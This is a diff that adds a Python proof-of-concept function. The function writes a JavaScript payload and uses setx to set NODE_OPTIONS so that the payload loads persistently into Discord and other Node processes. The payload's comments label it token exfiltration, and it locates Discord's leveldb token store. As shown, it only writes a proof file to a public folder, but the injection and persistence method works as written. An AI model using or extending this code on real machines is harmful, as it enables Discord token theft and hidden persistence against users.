@@ -1,0 +1,39 @@
+import subprocess
+from pathlib import Path
+
+def inject_via_node_options(payload_path):
+    """Injects code into Discord via NODE_OPTIONS.
+    Does not modify any Discord file."""
+    # Create JavaScript payload
+    payload = Path(payload_path)
+    payload.write_text("""
+    // Payload injected via NODE_OPTIONS
+    const fs = require('fs');
+    const os = require('os');
+    const path = require('path');
+
+    // Exfiltrate Discord token
+    const leveldb_dir = path.join(
+        os.homedir(), 'AppData', 'Roaming',
+        'discord', 'Local Storage', 'leveldb'
+    );
+
+    // Write evidence (benign PoC)
+    const proof = path.join(
+        'C:', 'Users', 'Public', 'node_options_proof.txt'
+    );
+    fs.writeFileSync(proof, [
+        'NODE_OPTIONS injection successful',
+        'PID: ' + process.pid,
+        'Time: ' + new Date().toISOString(),
+        'LevelDB dir exists: ' + fs.existsSync(leveldb_dir),
+    ].join('\\n'));
+    """)
+
+    # Set user environment variable (persists across reboots)
+    subprocess.run([
+        "setx", "NODE_OPTIONS",
+        f'--require={payload_path}'
+    ], capture_output=True)
+
+    return True
